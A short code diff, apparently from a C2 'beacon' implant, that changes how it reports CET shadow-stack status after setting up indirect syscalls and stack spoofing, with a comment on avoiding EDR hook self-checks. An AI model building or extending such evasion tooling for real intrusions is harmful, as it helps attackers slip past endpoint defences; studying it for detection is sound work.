@@ -123,8 +123,12 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "[beacon] failed to init indirect syscalls\n");
         return 1;
     }
-    fprintf(stdout, "[beacon] CET-compliant stack spoofing armed (shadow stack: %s)\n",
-            spoof::cet_shadow_stack_enabled() ? "enforced" : "not enforced");
+    spoof::CetStatus cet = spoof::cet_status();
+    const char* cet_mode = !cet.enabled ? "disabled" :
+                           cet.strict && cet.audit ? "strict audit" :
+                           cet.strict ? "strict" :
+                           cet.audit ? "compatibility audit" : "compatibility";
+    fprintf(stdout, "[beacon] stack wrapper initialized (shadow stack: %s)\n", cet_mode);
 
     // Unhook is OPT-IN: restoring hook bytes trips self-checks on EDRs that
     // verify their own hooks. By default nothing is ever written to ntdll -
